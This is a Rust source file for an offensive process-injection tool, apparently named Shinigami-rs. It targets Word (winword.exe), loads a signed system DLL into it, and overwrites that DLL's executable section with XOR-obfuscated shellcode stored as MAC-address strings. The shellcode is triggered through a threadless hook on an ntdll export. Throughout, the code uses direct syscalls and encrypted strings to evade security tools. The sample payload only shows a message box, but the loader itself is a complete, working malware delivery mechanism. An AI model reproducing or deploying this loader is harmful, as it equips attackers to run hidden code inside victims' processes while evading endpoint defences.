//#![allow(warnings, unused)]

#[macro_use]
extern crate litcrypt;


use memoffset::offset_of;
use obfstr::obfstr;
use rust_syscalls::syscall;
use std::ffi::{OsStr};
use std::io;
use std::os::windows::ffi::OsStrExt;
use std::{mem::size_of, ptr::null_mut};
use winapi::ctypes::c_void;

use windows_sys::Win32::{
    System::{
        
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ},
        SystemServices::{IMAGE_DOS_HEADER},
        Threading::{ PROCESS_ALL_ACCESS},
    },
};

use winapi::{
    
    shared::{
        ntdef::{HANDLE, PVOID, OBJECT_ATTRIBUTES, ULONG},
        basetsd::{SIZE_T},
        ntstatus::STATUS_SUCCESS,
    },

    um::{
        winnt::{IMAGE_NT_HEADERS, IMAGE_SECTION_HEADER, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ},
    },
};

use ntapi::{
    ntapi_base::{CLIENT_ID},
    ntldr::LDR_DATA_TABLE_ENTRY,
    ntpsapi::{PEB_LDR_DATA, PROCESS_BASIC_INFORMATION, ProcessBasicInformation},
    ntpebteb::PEB,
    ntexapi::{SYSTEM_PROCESS_INFORMATION, SystemProcessInformation},
};
use winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT;
use winapi::um::winnt::IMAGE_DOS_SIGNATURE;
use winapi::um::winnt::IMAGE_NT_SIGNATURE;
use winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
use core::ffi::c_char;
use core::ffi::CStr;
use winapi::um::winnt::MEM_RELEASE;
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;

// msfvenom -p windows/x64/messagebox TITLE=Shinigami-rs TEXT='Bankai! Tensa Zangetsu' ICON=WARNING EXITFUNC=thread -b '\xff\x00\x0b' -f raw -e none -o msgbox.bin
// python3 bin2mac_rs.py msgbox.bin > mac.txt
use_litcrypt!();

const MAC: &[&str] = &[
    "BE-0A-C3-A6-B2-BD",
    "BD-BD-AA-92-42-42",
    "42-03-13-03-12-10",
    "13-14-0A-73-90-27",
    "0A-C9-10-22-7C-0A",
    "C9-10-5A-7C-0A-C9",
    "10-62-7C-0A-C9-30",
    "12-7C-0A-4D-F5-08",
    "08-0F-73-8B-0A-73",
    "82-EE-7E-23-3E-40",
    "6E-62-03-83-8B-4F",
    "03-43-83-A0-AF-10",
    "03-13-7C-0A-C9-10",
    "62-7C-C9-00-7E-0A",
    "43-92-7C-C9-C2-CA",
    "42-42-42-0A-C7-82",
    "36-2D-0A-43-92-12",
    "7C-C9-0A-5A-7C-06",
    "C9-02-62-0B-43-92",
    "A1-1E-0A-BD-8B-7C",
    "03-C9-76-CA-0A-43",
    "94-0F-73-8B-0A-73",
    "82-EE-03-83-8B-4F",
    "03-43-83-7A-A2-37",
    "B3-7C-0E-41-0E-66",
    "4A-07-7B-93-37-94",
    "1A-7C-06-C9-02-66",
    "0B-43-92-24-7C-03",
    "C9-4E-0A-7C-06-C9",
    "02-5E-0B-43-92-7C",
    "03-C9-46-CA-0A-43",
    "92-03-1A-03-1A-1C",
    "1B-18-03-1A-03-1B",
    "03-18-0A-C1-AE-62",
    "03-10-BD-A2-1A-03",
    "1B-18-7C-0A-C9-50",
    "AB-0B-BD-BD-BD-1F",
    "0B-85-83-72-42-42",
    "42-7C-0A-CF-D7-58",
    "43-42-42-7C-0E-CF",
    "C7-73-43-42-42-0A",
    "73-8B-03-F8-07-C1",
    "14-45-BD-97-F9-A2",
    "5F-68-48-03-F8-E4",
    "D7-FF-DF-BD-97-0A",
    "C1-86-6A-7E-44-3E",
    "48-C2-B9-A2-37-47",
    "F9-05-51-30-2D-28",
    "42-1B-03-CB-98-BD",
    "97-00-23-2C-29-23",
    "2B-63-62-16-27-2C",
    "31-23-62-18-23-2C",
    "25-27-36-31-37-42",
    "11-2A-2B-2C-2B-25",
    "23-2F-2B-6F-30-31",
    "42-D2-D2-D2-D2-D2",

];

const KEY: u8 = 0x42;


fn main() {



    let process_name = "winword.exe";
    let file_path = "C:\\Windows\\System32\\mshtml.dll";
    let file_name = "mshtml.dll";

    println!("[+] Process Name: {}", process_name);
    println!("[+] Path: {}", file_path);

    let mut process = Process {
        process_name: process_name.to_owned(),
        process_id: 0,
        file_path: file_path.to_owned(),
        file_name: file_name.to_owned(),
        process_handle: 0,
        allocated_memory: 0,
        thread_handle: null_mut(),
    };

    // Inject a legitimate Microsoft signed DLL (e.g. amsi.dll)
    inject_dll(&mut process);
    
    // Inject the shellcode into the Microsoft Signed DLL inside the target process (e.g notepad.exe -> amsi.dll)
    let _ = inject_shellcode(&mut process);

}


struct Process {
    process_name: String,
    process_id: u32,
    file_path: String,
    file_name: String,
    process_handle: isize,
    allocated_memory: usize,
    thread_handle: HANDLE, // new field


}


fn get_process_handle(process_id: u32) -> Result<isize, String> {
    let mut object_attrs: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
    let mut client_id: CLIENT_ID = unsafe { std::mem::zeroed() };
    let mut handle: HANDLE = null_mut();

    client_id.UniqueProcess = process_id as *mut c_void;

    let status = unsafe {
        syscall!(
        "NtOpenProcess",
            &mut handle,
            PROCESS_ALL_ACCESS,
            &mut object_attrs,
            &mut client_id)
    };

    if status != 0 {
        panic!("{}", "[-] Error: failed to open process");
    }

    Ok(handle as isize)

}

/// Injects a DLL inside the target process (Classic DLL Injection)

fn inject_dll(process: &mut Process) {

    process.process_id =
        get_process_id_by_name(&process.process_name).expect(obfstr!("Failed to get process ID"));
    println!("[+] Found Process: {} With PID: {} ", process.process_name, process.process_id);
     
    process.process_handle = get_process_handle(process.process_id)
        .expect(obfstr!("Failed to get process handle")) as isize;


    let dll_path_wide: Vec<u16> = OsStr::new(&process.file_path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let mut base_address: PVOID = null_mut();
    let mut region_size: SIZE_T = (dll_path_wide.len() * 2) as SIZE_T;

    let status = unsafe {
        syscall!(
            "ZwAllocateVirtualMemory",
            process.process_handle as *mut c_void,
            &mut base_address,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        )
    };
    
    if status != 0 {
        panic!("{}",lc!("Failed to Allocate memory"));
    }
    process.allocated_memory = base_address as usize;

    let formatted_string = format!("{} {:#x}", lc!("[+] Allocated Memory:"), process.allocated_memory);
    println!("{}", formatted_string);

    // Write DLL path to process memory
    let status = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process.process_handle as *mut c_void,
            process.allocated_memory as *mut c_void,
            dll_path_wide.as_ptr() as *const c_void,
            dll_path_wide.len() * 2,
            null_mut::<usize>())
    };

    if status != 0 {
        panic!("{}",lc!("Failed to write to process memory"));
    }

   // Retrieve the LoadLibraryW function address
    let kernel32_base = get_module_base_by_name("KERNEL32.DLL", process.process_id)
        .expect(obfstr!("Failed to get KERNEL32.DLL base"));
    let formatted_string = format!("{} {:p}", lc!("[+] KERNEL32.DLL Base Address:"), kernel32_base);
    println!("{}", formatted_string);

    let loadlib_address = get_proc_address(kernel32_base, "LoadLibraryW")
        .expect(obfstr!("Failed to get LoadLibraryW address"));
    let formatted_string = format!("{} {:p}", lc!("[+] LoadLibraryW Address:"), loadlib_address);
    println!("{}", formatted_string);
    
    // Ensure shellcode is correctly constructed and the placeholders are correctly replaced with the appropriate addresses.
    let mut load_library_shellcode: Vec<u8> = vec![
        0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x30,
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xD0, 0xC9, 0xC3
    ];
    
    load_library_shellcode[10..18].copy_from_slice(&(process.allocated_memory as u64).to_le_bytes());
    load_library_shellcode[20..28].copy_from_slice(unsafe {
        std::slice::from_raw_parts(&loadlib_address as *const _ as *const u8, 8)
    });

    // Allocate memory in the target process for the shellcode
    let mut shellcode_address: PVOID = null_mut();
    let mut shellcode_size: SIZE_T = load_library_shellcode.len() as SIZE_T;
    let status = unsafe {
        syscall!(
            "ZwAllocateVirtualMemory",
            process.process_handle as *mut c_void,
            &mut shellcode_address,
            0,
            &mut shellcode_size,
            MEM_COMMIT | MEM_RESERVE ,
            PAGE_READWRITE
        )
    };
    if status != 0 {
        panic!("{} {:#X}", lc!("Failed to allocate memory for shellcode:"), status);
    }


    // Write the shellcode to the target process
    let status = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process.process_handle as *mut c_void,
            shellcode_address,
            load_library_shellcode.as_ptr() as *const c_void,
            load_library_shellcode.len(),
            null_mut::<usize>()
        )
    };
    if status != 0 {
        panic!("{}", lc!("Failed to write shellcode to target process"));
    }

    // After writing the shellcode to the target process
    let mut old_protect: u32 = 0;
    let protect_status = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            process.process_handle as *mut c_void,
            &mut shellcode_address,
            &mut shellcode_size,
            PAGE_EXECUTE_READ,
            &mut old_protect
        )
    };

    if protect_status != 0 {
        panic!("{}", lc!("Failed to change shellcode memory protection"));
    }

    let dll_base = get_module_base_by_name("ntdll.dll", process.process_id)
        .expect(obfstr!("Failed to get ntdll.dll base"));

    let load_address = get_proc_address(dll_base, "NtOpenFile")
        .expect(obfstr!("Failed to get CreateEventA address"));

    println!("{} {:#x}", lc!("[+] Crafted Assembly at address:"), shellcode_address as usize);

    let formatted_string = format!("{} {:p}", lc!("[+] Exported Functio Address:"), load_address);
    println!("{}", formatted_string);

    // Run the threadless thread
    let result = threadless_thread(
        process.process_handle as *mut c_void,
        shellcode_address as *mut c_void,
        load_address as *mut c_void
    );

    if !result {
        panic!("Threadless injection failed");
    }

    // Clean up
    let status = unsafe {
        syscall!(
            "ZwFreeVirtualMemory",
            process.process_handle as *mut c_void,
            &mut shellcode_address,
            &mut shellcode_size,
            MEM_RELEASE
        )
    };

    if status != 0 {
        panic!("Failed to free memory: {:#X}", status);

    }

}


fn inject_shellcode(process: &mut Process) -> Result<(), String> {

    let module_base = get_module_base_by_name(&process.file_name, process.process_id)
        .expect(obfstr!("Failed to get module base address"));
    
    println!("[+] Module Base: {:p}", module_base);
    
    let rx_section_offset = find_rx_section_offset(process, module_base as usize).expect(obfstr!("Failed to find rx section offset"));
    let rx_section_size = find_rx_section_size(process, module_base as usize).expect(obfstr!("Failed to get rx section size"));

    let nox = mac_to_bytes(MAC);
    if nox.len() > rx_section_size as usize {
        panic!("{}", lc!("[-] Shellcode is larger than RX section"));
    }


    let mut injection_address = unsafe { module_base.offset(rx_section_offset as isize) };
    
    let formatted_string = format!("{} {:p}", lc!("[+] RX Injection address: "), injection_address);
    println!("{}",formatted_string);

    let mut old_perms = 0;
    let mut region_size: SIZE_T = rx_section_size.try_into().unwrap(); // Define the region size as SIZE_T

    let protect_status = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            process.process_handle as *mut c_void,
            &mut injection_address as *mut _,
            &mut region_size,
            PAGE_READWRITE,  
            &mut old_perms
        )
    };
    
    if protect_status != 0 {
        panic!("{}", lc!("[-] Failed to change memory protection"));
    }

    let mut byteswritten = 0;
    let buffer = nox.as_ptr() as *mut c_void;
    let write_status = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process.process_handle as *mut c_void,
            injection_address as *mut c_void,
            buffer,
            nox.len(),
            &mut byteswritten
        )
    };
    if write_status != 0 {
        panic!("{}", lc!("[-] Failed to write process memory"));
    }

    let formatted_string = format!("{} {:x}", lc!("[+] Written Bytes:"), byteswritten);
    println!("{}",formatted_string);

    let protect_status = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            process.process_handle as *mut c_void,
            &mut injection_address as *mut _,
            &mut region_size,
            PAGE_EXECUTE_READ,
            &mut old_perms
        )
    };

    if protect_status != 0 {
        panic!("{} {:#X}", lc!("[-] Failed to change memory protection"), protect_status);
    }

    let dll_base = get_module_base_by_name("ntdll.dll", process.process_id)
        .expect(obfstr!("Failed to get ntdll.dll base"));

    let load_address = get_proc_address(dll_base, "NtCreateEvent")
        .expect(obfstr!("Failed to get CreateEventA address"));

    let formatted_string = format!("{} {:p}", lc!("[+] Exported Functio Address:"), load_address);
    println!("{}", formatted_string);

    // Run the threadless thread
    let result = threadless_thread(
        process.process_handle as *mut c_void,
        injection_address as *mut c_void,
        load_address as *mut c_void
    );

    if !result {
        panic!("Threadless injection failed");
    }

    
    unsafe { syscall!("NtClose",process.process_handle as *mut c_void)};
 
    Ok(())

}


fn read_memory<T>(process_handle: *mut c_void, address: usize) -> Result<T, String> {
    let mut buffer: T = unsafe { std::mem::zeroed() };
    let buffer_size = std::mem::size_of::<T>();

    let status = unsafe {
        syscall!(
            "ZwReadVirtualMemory",
            process_handle as *mut c_void,
            address as PVOID,
            &mut buffer as *mut T as *mut c_void,
            buffer_size as SIZE_T,
            std::ptr::null_mut::<c_void>()
        )
    };

    if status != 0 {

        panic!("{} {:p} {} {:#X}", lc!("Failed to read memory at address"),  address as *const u8, lc!("with NTSTATUS:"), status);
    }

    Ok(buffer)

}



fn find_rx_section_offset(process: &mut Process, module_base: usize) -> io::Result<u32> {
    let dos_header: IMAGE_DOS_HEADER = read_memory(process.process_handle as *mut c_void, module_base).expect(obfstr!("Failed to read DOS header"));
    let nt_headers: IMAGE_NT_HEADERS = read_memory(process.process_handle as *mut c_void, module_base + dos_header.e_lfanew as usize).expect(obfstr!("Failed to read NT headers"));

    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let section_header: IMAGE_SECTION_HEADER = read_memory(
            process.process_handle as *mut c_void,
            module_base + dos_header.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS>() as usize  + (i as usize) * std::mem::size_of::<IMAGE_SECTION_HEADER>(),
        )
        .expect(obfstr!("Failed to read section header"));

        if (section_header.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0
            && (section_header.Characteristics & IMAGE_SCN_MEM_READ) != 0
        {
            
            return Ok(section_header.VirtualAddress);
        }
    }

    
    Ok(0)

}


fn find_rx_section_size(process: &mut Process, module_base: usize) -> io::Result<u32> {
    let dos_header: IMAGE_DOS_HEADER = read_memory(process.process_handle as *mut c_void, module_base).expect(obfstr!("Failed to read DOS header"));
    let nt_headers: IMAGE_NT_HEADERS = read_memory(process.process_handle as *mut c_void, module_base + dos_header.e_lfanew as usize).expect(obfstr!("Failed to read NT headers"));

    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let section_header: IMAGE_SECTION_HEADER = read_memory(
            process.process_handle as *mut c_void,
            module_base + dos_header.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS>() as usize  + (i as usize) * std::mem::size_of::<IMAGE_SECTION_HEADER>(),
        )
        .expect(obfstr!("Failed to read section header"));

        if (section_header.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0
            && (section_header.Characteristics & IMAGE_SCN_MEM_READ) != 0
        {
            
            return Ok(section_header.SizeOfRawData);
        }
    }

    
    Ok(0)

}


fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
    let mut buffer: Vec<u8> = Vec::with_capacity(1024 * 1024);
    let mut return_length: ULONG = 0;

    let status = unsafe {
        syscall!(
        "NtQuerySystemInformation",
            SystemProcessInformation,
            buffer.as_mut_ptr() as *mut c_void,
            buffer.capacity() as ULONG,
            &mut return_length)
    };

    if status != STATUS_SUCCESS {
        return Err(obfstr!("Failed to call NtQuerySystemInformation").to_owned());
    }

    unsafe {
        buffer.set_len(return_length as usize);
    }

    let mut process_info = buffer.as_ptr() as *mut SYSTEM_PROCESS_INFORMATION;

    loop {
        let current_process_name_ptr = unsafe { (*process_info).ImageName.Buffer };
        let current_process_name_length = unsafe { (*process_info).ImageName.Length } as usize;

        if !current_process_name_ptr.is_null() {
            let current_process_name = unsafe {
                std::slice::from_raw_parts(current_process_name_ptr, current_process_name_length / 2)
            };

            let current_process_name_str = String::from_utf16_lossy(current_process_name);

            if current_process_name_str.to_lowercase() == process_name.to_lowercase() {
                return Ok(unsafe { (*process_info).UniqueProcessId } as u32);
            }
        }

        if unsafe { (*process_info).NextEntryOffset } == 0 {
            break;
        }

        process_info = unsafe {
            (process_info as *const u8).add((*process_info).NextEntryOffset as usize)
        } as *mut SYSTEM_PROCESS_INFORMATION;

    }
    unsafe {syscall!("NtClose",(*process_info).UniqueProcessId as HANDLE) };

    Err(obfstr!("Failed to find process").to_owned())

}


fn get_module_base_by_name(module_name: &str, process_id: u32) -> Result<*mut u8, String> {
    let process_handle = get_process_handle(process_id)?;
    let _object_attributes: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed::<OBJECT_ATTRIBUTES>() };
    let mut client_id: CLIENT_ID = unsafe { std::mem::zeroed::<CLIENT_ID>() };
    client_id.UniqueProcess = process_id as PVOID;

    let mut process_basic_info: PROCESS_BASIC_INFORMATION = unsafe { std::mem::zeroed::<PROCESS_BASIC_INFORMATION>() };
    let mut return_length: ULONG = 0;
    let status = unsafe {
        syscall!(
        "NtQueryInformationProcess",
            process_handle as *mut c_void,
            ProcessBasicInformation,
            &mut process_basic_info as *mut PROCESS_BASIC_INFORMATION as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
            &mut return_length)
    };

    if status != 0 {
        return Err(obfstr!("Failed to call NtQueryInformationProcess").to_owned());
    }

    let pbi = process_basic_info.PebBaseAddress;
    let mut peb: PEB = unsafe { std::mem::zeroed::<PEB>() };
    let status = unsafe {
        syscall!(
        "NtReadVirtualMemory",
            process_handle as *mut c_void,
            pbi as PVOID,
            &mut peb as *mut PEB as *mut c_void,
            size_of::<PEB>() as SIZE_T,
            std::ptr::null_mut::<c_void>())
    };

    if status != 0 {
        return Err(obfstr!("Failed to read PEB").to_owned());
    }

    let mut ldr_data: PEB_LDR_DATA = unsafe { std::mem::zeroed::<PEB_LDR_DATA>() };
    let status = unsafe {
        syscall!(
        "NtReadVirtualMemory",
            process_handle as *mut c_void,
            peb.Ldr as PVOID,
            &mut ldr_data as *mut PEB_LDR_DATA as *mut c_void,
            size_of::<PEB_LDR_DATA>() as SIZE_T,
            std::ptr::null_mut::<c_void>())
    };

    if status != 0 {
        return Err(obfstr!("Failed to read PEB_LDR_DATA").to_owned());
    }

    let mut ldr_entry: LDR_DATA_TABLE_ENTRY = unsafe { std::mem::zeroed::<LDR_DATA_TABLE_ENTRY>() };
    let mut current = ldr_data.InLoadOrderModuleList.Flink;

    loop {
        let ldr_entry_address = (current as usize - offset_of!(LDR_DATA_TABLE_ENTRY, InLoadOrderLinks)) as *mut LDR_DATA_TABLE_ENTRY;
        let status = unsafe {
        syscall!(
        "NtReadVirtualMemory",
                process_handle as *mut c_void,
                ldr_entry_address as PVOID,
                &mut ldr_entry as *mut LDR_DATA_TABLE_ENTRY as *mut c_void,
                size_of::<LDR_DATA_TABLE_ENTRY>() as SIZE_T,
                std::ptr::null_mut::<c_void>())
        };

        if status != 0 {
            return Err(obfstr!("Failed to read LDR_DATA_TABLE_ENTRY").to_owned());
        }

        let module_name_length = ldr_entry.BaseDllName.Length as usize;
        let mut module_name_vec = vec![0u16; module_name_length / 2];
        let status = unsafe {
            syscall!(
            "NtReadVirtualMemory",
                process_handle as *mut c_void,
                ldr_entry.BaseDllName.Buffer as PVOID,
                module_name_vec.as_mut_ptr() as *mut c_void,
                module_name_length as SIZE_T,
                std::ptr::null_mut::<c_void>())
        };

        if status != 0 {
            return Err(obfstr!("Failed to read module name").to_owned());
        }

        let current_module_name = String::from_utf16_lossy(&module_name_vec);
        if current_module_name.to_lowercase() == module_name.to_lowercase() {
            unsafe { syscall!("NtClose",process_handle as *mut c_void)};
            return Ok(ldr_entry.DllBase as *mut u8);
        }

        if current == ldr_data.InLoadOrderModuleList.Blink {
            break;
        }

        current = ldr_entry.InLoadOrderLinks.Flink;
    }

    unsafe { syscall!("NtClose",process_handle as *mut c_void)};
    Err(obfstr!("Failed to find module").to_owned())

}

fn get_proc_address(module_base: *mut u8, function_name: &str) -> Result<*mut c_void, String> {
    unsafe {
        let dos_header = *module_base.cast::<IMAGE_DOS_HEADER>();
        if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
            return Err(obfstr!("Invalid DOS signature").to_owned());
        }

        let nt_headers_ptr = module_base.add(dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS;
        let nt_headers = *nt_headers_ptr;

        if nt_headers.Signature != IMAGE_NT_SIGNATURE {
            return Err(obfstr!("Invalid NT signature").to_owned());
        }

        let export_dir_rva = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
        let export_dir = module_base.add(export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;

        let functions = module_base.add((*export_dir).AddressOfFunctions as usize) as *const u32;
        let names = module_base.add((*export_dir).AddressOfNames as usize) as *const u32;
        let ordinals = module_base.add((*export_dir).AddressOfNameOrdinals as usize) as *const u16;

        for i in 0..(*export_dir).NumberOfNames {
            let name_rva = *names.add(i as usize);
            let name_ptr = module_base.add(name_rva as usize) as *const c_char;
            let name_str = CStr::from_ptr(name_ptr).to_str().unwrap_or("");

            if name_str == function_name {
                let ordinal = *ordinals.add(i as usize) as usize;
                let function_rva = *functions.add(ordinal);
                let function_ptr = module_base.add(function_rva as usize) as *mut c_void;
                return Ok(function_ptr);
            }
        }

        Err(obfstr!("Function not found").to_owned())
    }

}


fn mac_to_bytes(shellcode: &[&str]) -> Vec<u8> {
    let mut bytes = Vec::new();

    for code in shellcode {
        let split_codes = code.split('-');
        for split_code in split_codes {
            let byte = u8::from_str_radix(split_code, 16).unwrap();
            bytes.push(byte ^ KEY);  // XOR each byte with the key
        }
    }

    bytes

}


fn threadless_thread(process_handle: *mut c_void, executable_code_address: *mut c_void, mut export_address: *mut c_void) -> bool {    // Memory Allocation for Trampoline
    let mut trampoline: Vec<u8> = vec![
        0x58,                                                           // pop RAX
        0x48, 0x83, 0xe8, 0x0c,                                         // sub RAX, 0x0C                    : when the function will return, it will not return to the next instruction but to the previous one
        0x50,                                                           // push RAX
        0x55,                                                           // PUSH RBP
        0x48, 0x89, 0xE5,                                               // MOV RBP, RSP
        0x48, 0x83, 0xec, 0x08,                                         // SUB RSP, 0x08                    : always equal to 8%16 to have an aligned stack. It is mandatory for some function call
        0x51,                                                           // push RCX                         : just save the context registers
        0x52,                                                           // push RDX
        0x41, 0x50,                                                     // push R8
        0x41, 0x51,                                                     // push R9
        0x41, 0x52,                                                     // push R10
        0x41, 0x53,                                                     // push R11
        0x48, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // movabs RCX, 0x0000000000000000   : restore the hooked function code
        0x48, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // movabs RDX, 0x0000000000000000   : restore the hooked function code
        0x48, 0x89, 0x08,                                               // mov qword ptr[rax], rcx          : restore the hooked function code
        0x48, 0x89, 0x50, 0x08,                                         // mov qword ptr[rax+0x8], rdx      : restore the hooked function code
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov RAX, 0x0000000000000000      : Address where the execution flow will be redirected
        0xff, 0xd0,                                                     // call RAX                         : Call the malicious code
        0x41, 0x5b,                                                     // pop R11                          : Restore the context
        0x41, 0x5a,                                                     // pop R10
        0x41, 0x59,                                                     // pop R9
        0x41, 0x58,                                                     // pop R8
        0x5a,                                                           // pop RDX
        0x59,                                                           // pop RCX
        0xc9,                                                           // leave
        0xc3 
    ];

    let mut original_instructions_high: u64 = 0;
    let mut original_instructions_low: u64 = 0;
    let mut sz_output: usize = 0;
    let original_export_address = export_address;

    // Read the original instructions
    let read_status_high = unsafe {
        syscall!(
            "ZwReadVirtualMemory",
            process_handle,
            export_address as *mut c_void,
            &mut original_instructions_high as *mut _ as *mut c_void,
            std::mem::size_of::<u64>(),
            &mut sz_output
        )
    };

    let read_status_low = unsafe {
        syscall!(
            "ZwReadVirtualMemory",
            process_handle,
            ((export_address as usize) + std::mem::size_of::<u64>()) as *mut c_void,
            &mut original_instructions_low as *mut _ as *mut c_void,
            std::mem::size_of::<u64>(),
            &mut sz_output
        )
    };

    if read_status_high != 0 || read_status_low != 0 {
        panic!("{}", lc!("Error reading virtual memory."));
    }
    println!("{} {:#p} {:#p}", lc!("[+] Original instructions read:"), original_instructions_high as *mut c_void, original_instructions_low as *mut c_void);


    trampoline[26..34].copy_from_slice(&original_instructions_high.to_le_bytes());
    trampoline[36..44].copy_from_slice(&original_instructions_low.to_le_bytes());
    trampoline[53..61].copy_from_slice(&(executable_code_address as u64).to_le_bytes());


    let mut trampoline_size = trampoline.len() as isize;
    let mut trampoline_address: *mut c_void = std::ptr::null_mut();
    let alloc_status = unsafe {
        syscall!(
            "ZwAllocateVirtualMemory",
            process_handle,
            &mut trampoline_address,
            0,
            &mut trampoline_size,
            MEM_COMMIT,
            PAGE_READWRITE
        )
    };

    if alloc_status != 0 {

        panic!("{} {:#X}",lc!("Error allocating virtual memory. Status:"),alloc_status);
    }


    println!("{} {:#p}", lc!("[+] Writing trampoline to:"), trampoline_address as *mut c_void);

    let write_status = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process_handle,
            trampoline_address,
            trampoline.as_ptr() as *const c_void,
            trampoline.len(),
            &mut sz_output
        )
    };

    if write_status != 0 {
        panic!("{} {:#X}", lc!("Error writing trampoline to memory. Status:"), write_status);
    }
    let mut old_protect: u32 = 0;
    // Change protection of trampoline to PAGE_EXECUTE_READ
    let protect_status = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            process_handle,
            &mut trampoline_address,
            &mut trampoline_size,
            PAGE_EXECUTE_READ,
            &mut old_protect
        )
    };
    if protect_status != 0 {
        panic!("{} {:#X}", lc!("Failed to change trampoline memory protection. Status:"), protect_status);
    }

    let mut hook: [u8; 12] = [
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0xFF, 0xD0
    ];

    hook[2..10].copy_from_slice(&(trampoline_address as u64).to_le_bytes());

    // Before writing the hook, change the memory protection of the target region.
    let mut old_protect_hook: u32 = 0;
    let protect_hook_status = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            process_handle,
            &mut export_address as *mut _ as *mut c_void,
            &mut sz_output,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect_hook
        )
    };

    if protect_hook_status != 0 {
        panic!("{} {:#X}", lc!("Failed to change hook memory protection before writing. Status:"), protect_hook_status);
    }
    println!("{} {:#p}", lc!("[+] Writing hook to:"), export_address);

    let hook_status = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process_handle,
            export_address as *mut c_void,
            &hook as *const _ as *const c_void,
            hook.len(),
            &mut sz_output
        )
    };

    if hook_status != 0 {
        panic!("{} {:#X}", lc!("Error writing hook to memory. Status:"), hook_status);
    }


    let mut hooked_bytes: [u8; 12] = [0; 12];
    loop {
        println!("{}", lc!("[+] Waiting 15 seconds for the hook to be called..."));
        std::thread::sleep(std::time::Duration::from_secs(15));
        let hook_check_status = unsafe {
            syscall!(
                "ZwReadVirtualMemory",
                process_handle,
                export_address as *mut c_void,
                &mut hooked_bytes as *mut _ as *mut c_void,
                hook.len(),
                &mut sz_output
            )
        };

        if hook_check_status != 0 {
            panic!("{} {:#X}", lc!("Error checking if hook has been executed. Status:"), hook_check_status);
        }

        if hooked_bytes != hook {
            break;
        }
    }

    
    println!("{} {:#p}", lc!("[+] Freeing trampoline at:"), trampoline_address as *mut c_void);

    let mut size_null: usize = 0;
    let free_status = unsafe {
        syscall!(
            "ZwFreeVirtualMemory",
            process_handle,
            &mut trampoline_address,
            &mut size_null as *mut _ as *mut c_void,
            MEM_RELEASE
        )
    };

    if free_status != 0 {
        panic!("{} {:#X}", lc!("Failed to FreeVirtualMemory. Status:"), free_status);
    }

    println!("{} {:#p}", lc!("[+] Restoring original instructions at:"), original_export_address);

    let restore_status_high = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process_handle,
            export_address as *mut c_void, // <-- Use original_export_address
            &original_instructions_high as *const _ as *const c_void,
            std::mem::size_of::<u64>(),
            &mut sz_output
        )
    };

    let restore_status_low = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process_handle,
            ((export_address as usize) + std::mem::size_of::<u64>()) as *mut c_void, // <-- Use original_export_address
            &original_instructions_low as *const _ as *const c_void,
            std::mem::size_of::<u64>(),
            &mut sz_output
        )
    };

    if restore_status_high != 0 || restore_status_low != 0 {
        panic!("{}", lc!("Failed to WriteVirtualMemory. Status:"));
    }

    let restore_protect_hook_status = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            process_handle,
            &mut export_address as *mut _ as *mut c_void,
            &mut sz_output,
            PAGE_EXECUTE_READ,
            &mut old_protect_hook
        )
    };

    if restore_protect_hook_status != 0 {
        panic!("{} {:#X}", lc!("Failed to restore hook memory protection after writing. Status:"), restore_protect_hook_status);
    }

    true

}
